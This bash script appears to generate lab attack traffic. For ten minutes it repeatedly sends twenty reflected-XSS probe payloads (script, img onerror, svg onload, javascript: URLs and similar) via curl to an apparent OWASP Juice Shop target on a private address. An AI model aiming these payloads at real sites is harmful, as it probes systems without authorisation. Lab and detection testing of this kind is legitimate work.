#!/bin/bash
TARGET_IP="${TARGET_IP:-100.64.0.20}"
JUICE_URL="http://${TARGET_IP}:${PORT}"
DURATION_SECONDS=600
END_TIME=$(( $(date +%s) + DURATION_SECONDS ))
INTERVAL=2

ts() { date +"%Y-%m-%dT%H:%M:%S.%3N%:z"; }

total_attacks=0

echo "--- Starting PortSwigger XSS Loop for ${DURATION_SECONDS} seconds ---"
echo "Target: $JUICE_URL"

while [ "$(date +%s)" -lt "$END_TIME" ]; do

  echo "[$(ts)] Attack 1"
  curl -s "${JUICE_URL}/?q=<script>alert(1)</script>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 2"
  curl -s "${JUICE_URL}/?q=<img%20src=x%20onerror=alert(1)>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 3"
  curl -s "${JUICE_URL}/?q=<svg%20onload=alert(1)>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 4"
  curl -s "${JUICE_URL}/?q=<iframe%20src='javascript:alert(1)'>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 5"
  curl -s "${JUICE_URL}/?q=<a%20href='javascript:alert(1)'>Click</a>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 6"
  curl -s "${JUICE_URL}/?q=<input%20autofocus%20onfocus=alert(1)>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 7"
  curl -s "${JUICE_URL}/?q=<body%20onload=alert(1)>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 8"
  curl -s "${JUICE_URL}/?q=<details%20open%20ontoggle=alert(1)>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 9"
  curl -s "${JUICE_URL}/?q=\"><svg%20onload=alert(1)>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 10"
  curl -s "${JUICE_URL}/?q=</textarea><script>alert(1)</script>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 11"
  curl -s "${JUICE_URL}/?q=<img%20src=1%20onerror=prompt(1)>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 12"
  curl -s "${JUICE_URL}/?q=<marquee%20onstart=confirm(1)>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 13"
  curl -s "${JUICE_URL}/?q=<script>/*</script><script>alert(1)</script>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 14"
  curl -s "${JUICE_URL}/?q=<script>''-alert(1)//</script>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 15"
  curl -s "${JUICE_URL}/?q=<svg><script>alert(1)</script></svg>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 16"
  curl -s "${JUICE_URL}/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 17"
  curl -s "${JUICE_URL}/?q=<video%20src='invalid'%20onerror='alert(1)'>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 18"
  curl -s "${JUICE_URL}/?q=<object%20data='javascript:alert(1)'>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 19"
  curl -s "${JUICE_URL}/?q=<embed%20src='javascript:alert(1)'>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

  echo "[$(ts)] Attack 20"
  curl -s "${JUICE_URL}/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>" -o /dev/null
  ((total_attacks++))
  sleep "$INTERVAL"

done

echo "--- XSS attack loop complete ---"
echo "Total XSS attacks sent: $total_attacks with end time: $(ts)"
